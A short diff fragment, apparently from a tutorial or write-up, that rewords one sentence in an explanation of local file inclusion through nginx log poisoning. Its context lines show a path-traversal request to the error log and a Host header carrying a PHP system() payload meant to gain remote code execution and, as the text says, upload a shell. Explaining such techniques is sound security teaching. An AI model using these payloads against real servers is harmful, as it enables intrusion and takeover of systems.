@@ -12,7 +12,7 @@ GET /blog.php?page=../../../../var/log/nginx/error.log
 Host: target-website.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
 ```
-Notice that in the log file, the `Host` HTTP header is displayed along with other HTTP headers. Therefore, we will attempt to remote code execution to view the contents of a sensitive file or upload a shell to gain full control of the server.
+Notice that in the log file, the `Host` HTTP header is displayed. Therefore, we will attempt remote code execution to view the contents of a sensitive file or upload a shell to gain full control of the server.
 ```http
 GET /blog.php?page=../../../../var/log/nginx/error.log
 Host: <?php system('ls /etc/passwd') ?>
